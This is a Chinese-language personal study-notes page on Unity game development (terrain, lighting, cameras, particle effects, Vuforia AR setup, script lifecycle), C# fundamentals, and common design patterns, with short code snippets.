<h3 id="地形"><a href="#地形" class="headerlink" title="地形"></a>地形</h3><p>一种游戏对象。</p>
<p>Terrain：地形</p>
<ul>
<li>Terrain：地形修改器<ul>
<li>Brush：<ul>
<li>Brush Size：大小</li>
<li>Opacity：硬度</li>
</ul>
</li>
<li>地形<ul>
<li>抬高</li>
<li>恒高</li>
</ul>
</li>
<li>地形纹理<ul>
<li>可添加多个纹理，作为笔刷</li>
</ul>
</li>
<li>种树种草</li>
<li>放水</li>
</ul>
</li>
</ul>
<h3 id="灯光"><a href="#灯光" class="headerlink" title="灯光"></a>灯光</h3><p>灯光可以是游戏对象，也可以是组件。</p>
<p>灯光类型：</p>
<ul>
<li>Directional Light：影响所有物体</li>
<li>Point</li>
<li>Spot</li>
<li>Area</li>
</ul>
<p>项目设置-&gt;Player，可以在不同平台上设置渲染路径。<br>Vertex List<br>Forward<br>Deferred Lighting</p>
<p>灯光类型：点，聚光灯Spot，方向灯，区域灯光。<br>阴影类型。<br>灯光耀斑：Draw Halo<br>渲染重要性：Render Mode</p>
<h3 id="摄像机"><a href="#摄像机" class="headerlink" title="摄像机"></a>摄像机</h3><p>ClearFlag：天空盒，实体色，深度信息（多摄像机叠加）等。<br>投影方式。<br>前后截面。<br>视口尺寸。<br>深度：深度大的会叠加到深度小的摄像机上。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>GameObject包含的组件</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">tranform <span class="comment">// 位移</span></span><br><span class="line">rigibody <span class="comment">// 刚体</span></span><br><span class="line">camera</span><br><span class="line">light</span><br><span class="line">render</span><br><span class="line">animation</span><br><span class="line">audio</span><br><span class="line">其他</span><br><span class="line"><span class="comment">// 或写为</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.transform</span><br><span class="line"><span class="comment">// 其他组件 </span></span><br><span class="line">other.GetComponent(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">other.GetComponent(filename)</span><br><span class="line">other.GetComponent&lt;filename&gt;()</span><br><span class="line"><span class="comment">// 搜索</span></span><br><span class="line">GameObject.FindGameObjectWithTag(<span class="string">&quot;tag&quot;</span>)</span><br><span class="line"><span class="comment">// 消息传递</span></span><br><span class="line">gameObject.SendMessageUpwards(<span class="string">&quot;ApplyDamage&quot;</span>, <span class="number">5.0</span>);</span><br></pre></td></tr></table></figure>

<p>Time对象，记录各种间隔时间。</p>
<h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">    <span class="comment">// 启动一个协程，异步调用</span></span><br><span class="line">    StartCoroutine(Routine());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">IEnumerator <span class="title">Routine</span>()</span>&#123;</span><br><span class="line">    <span class="comment">// 等待协程操作</span></span><br><span class="line">    <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">1f</span></span>)</span>;</span><br><span class="line">    <span class="comment">// 执行剩余任务</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h3><p>所有GUI相关都在OnGUI中实现。<br>常用控件：</p>
<ul>
<li>Label</li>
<li>Button：点击后，返回True</li>
<li>RepeatButton：按下后持续执行。</li>
<li>TextField：返回string</li>
<li>Toggle：开关</li>
<li>HorizontalSlider：滑块<br>复合控件：</li>
<li>Toolbar</li>
<li>SelectionGrid</li>
</ul>
<p>GUI.changed：GUI更新<br>GUI.skin：GUI风格</p>
<p>定义组：</p>
<ul>
<li>GUI.BeginGroup()</li>
<li>GUI.EndGroup()</li>
</ul>
<p>GUILayout.Button<br>GUILayout.Box</p>
<h3 id="HUD"><a href="#HUD" class="headerlink" title="HUD"></a>HUD</h3><p>角色屏幕上固定的界面。</p>
<p>Add Component，GUITexture，然后调整位置大小。</p>
<h3 id="特效"><a href="#特效" class="headerlink" title="特效"></a>特效</h3><p>使用粒子系统添加特效。<br>OpenEditor：打开独立编辑器。<br><code>+</code>-&gt;Show All Modules：显示所有特效<br>基本参数：</p>
<ul>
<li>Duration：粒子持续时间</li>
<li>Loging：循环</li>
<li>Prewarm：预热，一般不需要</li>
<li>Start XXX：启动设置，可以设置曲线（随机数范围）</li>
<li>Gravity Multiplier：重力</li>
<li>Inherit Velocity：继承速度，没用</li>
<li>Simulation Space：本地坐标，世界坐标，粒子是否随着发射器移动</li>
<li>Play On Awake：是否初始激活</li>
<li>Max Particles：最大粒子数<br>Emission：</li>
<li>Rate：发射速率 &#x2F; 距离</li>
<li>Bursts：爆炸<br>Shape：</li>
<li>Shape：形状</li>
<li>Angle：角度</li>
<li>Radius：半径</li>
<li>Length：长度</li>
<li>EmitFromShell：发射面</li>
<li>Random Direction：随机方向<br>XXX Over LifeTime：速度，限制速度，力，颜色，大小，旋转</li>
<li>XYZ：速度方向</li>
<li>Space：坐标</li>
<li>Dampen：阻尼</li>
<li>Separate Axis：锁定轴<br>XXX By Speed：颜色，大小，旋转<br>External Forces：力学，不用<br>Collision：碰撞，消耗资源</li>
<li>Planes：碰撞面板</li>
<li>Scale Plane</li>
<li>Dampen：阻尼</li>
<li>Bounce：摩擦</li>
<li>Lifetime Less：减少的寿命</li>
<li>Min Kill Speed</li>
<li>Particle Radius：碰撞位置偏移</li>
<li>Send Collision Message：发送碰撞信息<br>Sub Emitters：下一个粒子系统</li>
<li>Birth</li>
<li>Collision</li>
<li>Death<br>Texture Sheet Animation：贴图UV动画</li>
<li>Tiles</li>
<li>Animation</li>
<li>Frame Over TIme</li>
<li>Cycles<br>Render</li>
<li>Render Mode：板，拉伸，平行，垂直，模型</li>
<li>Normal Direction</li>
<li>Material：材质</li>
<li>Sort Mode</li>
<li>Sorting Fudge：优先渲染</li>
<li>Case Shadows</li>
<li>Receive Shadows</li>
<li>Max Particles Size：最大大小</li>
</ul>
<h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><p>CharacterController：角色控制器<br>CharacterMotor：角色引擎</p>
<h3 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h3><p>Mecanim</p>
<h3 id="射线碰撞"><a href="#射线碰撞" class="headerlink" title="射线碰撞"></a>射线碰撞</h3><p>Raycast</p>
<h3 id="资源包"><a href="#资源包" class="headerlink" title="资源包"></a>资源包</h3><p>导出：在项目目录 Export Package</p>
<p>导入：在项目目录 Import Package</p>
<ul>
<li>自定义资源包</li>
<li>内置资源包（Standard Asserts）</li>
</ul>
<h3 id="Asset-Store"><a href="#Asset-Store" class="headerlink" title="Asset Store"></a>Asset Store</h3><p>在线资源库。</p>
<h3 id="高通-AR"><a href="#高通-AR" class="headerlink" title="高通 AR"></a>高通 AR</h3><p>首先在<a href="https://developer.vuforia.com/">高通AR</a>上下载资SDK（需要注册）。</p>
<p>将下载的SDK资源包导入到Unity中。如果中途提示升级，不需要升级。</p>
<p>配置License Key，要到官网申请License Key，并将其配置到项目中。</p>
<p>在Develop -&gt; License Manager中申请（Development）。</p>
<p>点击创建的项目，进入项目详情，可以看到License Key。复制Key，进入项目目录，在Resources-&gt;VuforiaConfiguration中加入Key。</p>
<p>之后上传图片：将要扫描的图片上传到高通，进入Target Manager -&gt; Database，创建数据库，Device，然后进入数据库，Add Target，Single Image，上传图片。</p>
<p>之后下载数据库并导入项目，Download Database，Unity，将下载的数据库导入到项目。</p>
<p>在项目中，首先删掉 Main Camera，并导入AR Camera。Vuforia Prefabs AR Camera，和 Image Target。</p>
<p>再配置Image Target，在其插件中配置Database，Image Target，高和宽，</p>
<p>再配置 VuforiaConfiguration，Datasets，Load并Active。</p>
<p>放置要出现的虚拟物体，作为Image Target的子物体。</p>
<h2 id="C-Sharp"><a href="#C-Sharp" class="headerlink" title="C Sharp"></a>C Sharp</h2><p>字符串是引用类型。字符串操作：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> str = <span class="string">$&quot;this is <span class="subst">&#123;box&#125;</span>&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> str = <span class="string">@&quot;C:\Program files\&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>控制台输入输出</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> str = Console.ReadLine(<span class="string">&quot;&#123;0&#125;&quot;</span>, box);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;&#123;0&#125;&quot;</span>, box);</span><br><span class="line">Console.ReadKey();</span><br></pre></td></tr></table></figure>

<p>遍历数组</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无法修改元素</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="built_in">int</span> x <span class="keyword">in</span> array) &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>param关键字：用来修饰形参</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用</span></span><br><span class="line">method(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 定义</span></span><br><span class="line">method(param <span class="built_in">int</span>[] array) &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>引用，ref可以不赋值，但是out必须赋值，且out默认没有值，不可以直接使用。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传入引用</span></span><br><span class="line">method(<span class="keyword">ref</span> a);</span><br><span class="line">method(<span class="keyword">ref</span> <span class="built_in">int</span> a) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入引用</span></span><br><span class="line">method(<span class="keyword">out</span> a);</span><br><span class="line">method(<span class="keyword">out</span> <span class="built_in">int</span> a) &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>类继承后，重写父类方法，可以用new；虚函数virtual可以重写override。</p>
<p>类和结构体的区别是，类在堆上，结构体在栈上（值类型）。<br>结构体必须是有参构造方法，并要给所有字段赋值。</p>
<p>类的默认类型是internal，在项目内部可见。</p>
<p>Sealed：密封，不允许继承，可以用于修饰类和方法。</p>
<p>命名空间中只有类，结构体，枚举，接口。</p>
<p>运算符重载</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Point <span class="keyword">operator</span> +(Point p1, Point p2) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抽象类abstract类</p>
<p>接口Interface：一系列的规范，接口实现必须是public</p>
<p>委托可以直接赋值</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">TestDelegate oneDelegate = TestMethod;</span><br></pre></td></tr></table></figure>

<p>匿名函数</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">TestDelegateX method = <span class="built_in">delegate</span>()&#123;&#125;;</span><br><span class="line">TestDelegateX method = () =&gt; &#123;&#125;; <span class="comment">// 参数 =&gt; 方法体</span></span><br></pre></td></tr></table></figure>

<p>用委托可以实现回调。</p>
<p>泛型，泛型不可继承</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Person</span>&lt;<span class="title">T</span>&gt; &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>集合：是容器，变长的，类型可不同。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ArrayList list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">list.Add(<span class="number">1</span>);</span><br><span class="line">list.Add(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">list.AddRange(<span class="keyword">new</span> ICollection()); <span class="comment">//ICollection可以是集合，数组等</span></span><br><span class="line">list.Remove(); <span class="comment">// 删掉第一个匹配项</span></span><br><span class="line">list.RemoveAt(); <span class="comment">// 删除某个</span></span><br><span class="line">list.RemoveRange();  <span class="comment">// 批量删除，下标与长度</span></span><br><span class="line">list.SetRange(<span class="number">0</span>, <span class="keyword">new</span> <span class="built_in">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;);</span><br><span class="line">list.IndexOf();</span><br><span class="line">list.LastIndexOf();</span><br><span class="line">list.BinarySearch(); <span class="comment">// 二分查找</span></span><br><span class="line">list.Sort();</span><br><span class="line">list.Reverse();</span><br><span class="line">list.Contains();</span><br><span class="line">list.Insert(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">list.InsertRange(<span class="number">0</span>, <span class="built_in">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>实现ICompareable可以实现排序。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">CompareTo &lt;<span class="number">0</span> <span class="keyword">this</span>&lt;obj</span><br></pre></td></tr></table></figure>

<p>List：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">list.RemoveAll(Predicate&lt;<span class="keyword">in</span> T&gt;(T obj)); <span class="comment">// 删除匹配项</span></span><br><span class="line">list.RemoveAll(name =&gt; name==<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">Exists(name =&gt; name==<span class="string">&quot;abc&quot;</span>)   <span class="comment">// 判断存在</span></span><br><span class="line">FindXXX(name =&gt; name==<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">GetRange() <span class="comment">// 获取子集</span></span><br></pre></td></tr></table></figure>

<p>其他类型：<br>Stack<br>Queue<br>Hashtable：键值对，内部按照Key的Hash排序<br>Dictionary：字典，必须指定类型</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Hashtable table = <span class="keyword">new</span> Hashtable();</span><br><span class="line">table.Add(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(DictionaryEntry entry <span class="keyword">in</span> table)&#123;</span><br><span class="line">    entry.Key;</span><br><span class="line">    entry.Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; dic = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">dic.Add(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(KeyValuePair&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; pair <span class="keyword">in</span> dic)&#123;</span><br><span class="line">    pair.Key;</span><br><span class="line">    pair.Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则表达式：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Test</span>()</span>&#123;</span><br><span class="line">        <span class="built_in">bool</span> result = Regex.IsMatch(<span class="string">&quot;a string&quot;</span>, <span class="string">&quot;^[1-9]\\d&#123;4,10&#125;$&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>^</code>: 字符串开头<br><code>$</code>: 字符串结尾<br><code>[]</code>: 匹配括号中的一位字符<br><code>[^]</code>: 匹配括号以外的一位字符<br><code>+</code>: 匹配1次或多次<br><code>*</code>: 匹配0次或多次<br><code>?</code>: 匹配0次或1次<br><code>&#123;m&#125;</code>: 恰好出现m次<br><code>&#123;m,&#125;</code>: 至少出现m次<br><code>&#123;m,n&#125;</code>: 出现m到n次<br><code>\d</code>: <code>[0-9]</code><br><code>.</code>: 匹配任意字符<br><code>()</code>: 分组，返回Match，多个分组</p>
<p>异常处理：如果Catch异常有继承关系，父类应放到最后。</p>
<p>反射：可以通过类名，字段来实例化对象，操作类成员。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 已有的定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Type</span>&#123;</span><br><span class="line">    FieldInfo,</span><br><span class="line">    MethodInfo,</span><br><span class="line">    Constructor,</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化对象</span></span><br><span class="line">Type t = Type.GetType(<span class="string">&quot;Space.Person&quot;</span>); <span class="comment">// 通过类名获取类型  </span></span><br><span class="line"><span class="built_in">object</span> obj = Activator.CreateInstance(t); <span class="comment">// 只能是 public 构造方法</span></span><br><span class="line"><span class="built_in">object</span> obj = Activator.CreateInstance(t, <span class="literal">true</span>); <span class="comment">// private, internal 也可以</span></span><br><span class="line"><span class="built_in">object</span> obj = Activator.CreateInstance(t, para1, para2); <span class="comment">// 有参构造</span></span><br><span class="line"><span class="built_in">object</span> obj = Activator.CreateInstance(t, BindingFlags.NonPublic|BindingFlags.Instance, <span class="literal">null</span>, <span class="keyword">new</span> <span class="built_in">object</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;, <span class="literal">null</span>); <span class="comment">// 有参其他权限构造</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问属性</span></span><br><span class="line">FileInfo name = t.GetField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">FileInfo name = t.GetField(<span class="string">&quot;name&quot;</span>, BindingFlags.NonPublic|BindingFlags.Instance);</span><br><span class="line">name.SetValue(obj, <span class="string">&quot;abc&quot;</span>); <span class="comment">// 静态成员，则用null</span></span><br><span class="line"><span class="built_in">object</span> x = name.GetValue(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问方法</span></span><br><span class="line">MethodInfo method = t.GetMethod(<span class="string">&quot;Show&quot;</span>, BindingFlags.NonPublic|BindingFlags.Instance);</span><br><span class="line">method.Infoke(<span class="literal">null</span>, <span class="literal">null</span>); <span class="comment">// 第一个是谁在调用，第二个是调用的参数列表</span></span><br><span class="line"></span><br><span class="line">MethodInfo method = t.GetMethod(<span class="string">&quot;Show&quot;</span>, BindingFlags.NonPublic|BindingFlags.Instance, <span class="literal">null</span>, <span class="keyword">new</span> Type[]&#123;<span class="keyword">typeof</span>(<span class="built_in">string</span>), <span class="keyword">typeof</span>(<span class="built_in">double</span>)&#125;, <span class="literal">null</span>); <span class="comment">// 有重载的方法，Type中为参数类型列表</span></span><br><span class="line"><span class="built_in">object</span> result = method.Infoke(obj, <span class="keyword">new</span> <span class="built_in">object</span>[]&#123;<span class="string">&quot;1&quot;</span>, <span class="number">2.0</span>&#125;); <span class="comment">// 第一个是谁在调用，第二个是调用的参数列表</span></span><br></pre></td></tr></table></figure>




<h2 id="Mono脚本的生命周期"><a href="#Mono脚本的生命周期" class="headerlink" title="Mono脚本的生命周期"></a>Mono脚本的生命周期</h2><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><p>Reset：当脚本被附加或重置时执行。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>Awake：初始化后的第一步操作，整个声明周期只执行一次。<br>OnEnable：启动后的操作，可以多次执行。<br>Start：当第一帧启动前执行一次。</p>
<h3 id="物理引擎"><a href="#物理引擎" class="headerlink" title="物理引擎"></a>物理引擎</h3><p>从物理引擎开始，每一帧都要执行。<br>物理引擎部分一帧可能执行多次。<br>物理引擎是个非常消耗资源的部分。</p>
<p>FixedUpdate：按固定时间间隔执行。<br>yield WaitForFixedUpdate<br>OnTriggerXXX<br>OnCollisionXXX</p>
<h3 id="Input-事件"><a href="#Input-事件" class="headerlink" title="Input 事件"></a>Input 事件</h3><p>OnMouseXXX：响应设备事件。</p>
<h3 id="游戏逻辑"><a href="#游戏逻辑" class="headerlink" title="游戏逻辑"></a>游戏逻辑</h3><p>Update<br>yield null<br>yield WWW<br>yield WaitForSeconds<br>yield StartCoroutine<br>内部动画更新。<br>LateUpdate</p>
<h3 id="场景渲染"><a href="#场景渲染" class="headerlink" title="场景渲染"></a>场景渲染</h3><p>OnWillRenderObject：渲染前<br>OnPreCull<br>OnBecameVisible<br>OnBecamingVisible<br>OnPreRender<br>OnRenderObject<br>OnPostRender<br>OnRenderImage</p>
<h3 id="Gizmos-渲染"><a href="#Gizmos-渲染" class="headerlink" title="Gizmos 渲染"></a>Gizmos 渲染</h3><p>OnDrawGizmos</p>
<h3 id="GUI-渲染"><a href="#GUI-渲染" class="headerlink" title="GUI 渲染"></a>GUI 渲染</h3><p>OnGUI：可循环多次，但不建议使用</p>
<h3 id="帧结束"><a href="#帧结束" class="headerlink" title="帧结束"></a>帧结束</h3><p>yield WaitForEndOfFrame</p>
<h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><p>OnApplicationPause</p>
<h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><p>OnDisable</p>
<h3 id="销毁"><a href="#销毁" class="headerlink" title="销毁"></a>销毁</h3><p>OnApplicationQuit<br>OnDelete<br>OnDestory</p>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><h3 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h3><h4 id="单一职责"><a href="#单一职责" class="headerlink" title="单一职责"></a>单一职责</h4><p>对象的职能只有一个。</p>
<h4 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h4><p>对象应该对于扩展是开放的，但是对于修改是封闭的。</p>
<h4 id="依赖倒置原则"><a href="#依赖倒置原则" class="headerlink" title="依赖倒置原则"></a>依赖倒置原则</h4><p>首先了解需求，画图表示；写出代码。</p>
<h4 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h4><p>接口里面的单一原则，也就是接口只负责一个功能。</p>
<h4 id="合成复用原则"><a href="#合成复用原则" class="headerlink" title="合成复用原则"></a>合成复用原则</h4><p>父类解决共有问题，子类解决特有问题。</p>
<p>是什么的问题改为有什么的问题。</p>
<p>能用现有的类，就不要创建新类。</p>
<h4 id="迪米特法则"><a href="#迪米特法则" class="headerlink" title="迪米特法则"></a>迪米特法则</h4><p>最少知识原则：尽量不牵扯到其他的类</p>
<h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>整个软件的声明周期，有且只有一个实例。</p>
<p>拖拽一次，实例化一次。</p>
<p>用在组织框架管理者身上：WWW管理器，UI管理器，音效管理器。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只能拖拽挂载，不能 new</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Single</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Single instance;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>()</span>&#123;</span><br><span class="line">        instance = <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另外一种方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Single</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Single instance;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Single Instance&#123;</span><br><span class="line">        <span class="keyword">get</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">                instance = <span class="keyword">new</span> Single;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><p>交给它任务，它自动生产，最后返回一个产品。</p>
<p>不关心生产过程，用于创建新的对象。</p>
<p>例如生产金币，怪物。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Factory</span>&#123;</span><br><span class="line">    Sprite[] allSprite；</span><br><span class="line">    Transform parents;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Factory</span>()</span>&#123;</span><br><span class="line">        Initial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Initial</span>()</span>&#123;</span><br><span class="line">        allSprite = Resources.LoadAll&lt;Sprite&gt;(<span class="string">&quot;res&quot;</span>);</span><br><span class="line">        <span class="comment">// 场景中唯一的物体，才做标记，灯光，摄像机</span></span><br><span class="line">        parents = GameObject.FindGameObjectWithTag(<span class="string">&quot;MainCanvas&quot;</span>).transform; <span class="comment">// 深度优先遍历，效率低</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GameObject <span class="title">CreateImage</span>(<span class="params"><span class="built_in">int</span> index, Vector3 pos</span>)</span>&#123;</span><br><span class="line">        GameObject obj = <span class="keyword">new</span> GameObject();</span><br><span class="line">        obj.name = index.ToString();</span><br><span class="line">        <span class="comment">// 设置物体 Parents</span></span><br><span class="line">        obj.transform.SetParent(parents, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 设置在 Parents 下的位置</span></span><br><span class="line">        obj.transform.SetAsSiblingIndex(<span class="number">2</span>);</span><br><span class="line">        obj.transform.SetAsLastSibling();</span><br><span class="line">        obj.transform.SetAsFirstSibling();</span><br><span class="line">        obj.transform.localPosition = pos;</span><br><span class="line"></span><br><span class="line">        Image img = obj.AddComponent&lt;Image&gt;();</span><br><span class="line">        index = index % allSprite.Length;</span><br><span class="line">        img.sprite = allSprite[index];</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UseFactory</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    Factory factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        factory = <span class="keyword">new</span> Factory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        <span class="built_in">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(Input.GetKeyDown(KeyCode.Space))&#123;</span><br><span class="line">            facotry.CreateImage(++cnt, Vector3.one * cnt * <span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h4><p>不断地询问。</p>
<p>例如：播放一个动作，在1s的时候播放音效。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Obstor</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    Animation animal;</span><br><span class="line">    <span class="built_in">float</span> timeCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        animal = GetComponent&lt;Animation&gt;();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PlayAction</span>()</span>&#123;</span><br><span class="line">        animal.Play(<span class="string">&quot;Action&quot;</span>);</span><br><span class="line">        timeCount = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尽量轻量级</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!animal.isPlaying)&#123;</span><br><span class="line">            <span class="comment">// 判断动画是否完成</span></span><br><span class="line">        &#125;</span><br><span class="line">        timeCount += Time.deltaTime;</span><br><span class="line">        <span class="keyword">if</span>(timeCount &gt; <span class="number">1.0f</span>)&#123;</span><br><span class="line">            timeCount = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 判断是否到某个时间节点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>使用回调（代理）的方式调用对方。B留出回调指针，M给B的回调指针加上A的方法。当触发到某一事件时，B调用回调函数，就会间接调用A。</p>
<p>例如：按钮事件。</p>
